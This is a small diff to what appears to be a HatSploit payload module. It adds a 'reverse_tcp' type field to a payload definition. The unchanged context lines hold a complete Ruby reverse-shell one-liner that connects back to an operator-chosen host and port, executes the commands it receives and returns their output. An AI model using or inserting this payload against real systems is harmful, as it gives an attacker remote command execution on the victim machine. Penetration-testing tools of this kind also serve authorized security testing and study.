@@ -56,5 +56,6 @@ class HatSploitPayload(HatSploitPayload):
 
         self.data['payload'] = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\""+local_host+"\",\""+local_port+"\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
         self.data['execute'] = self.data['payload']
+        self.data['type'] = 'reverse_tcp'
 
         return self.data
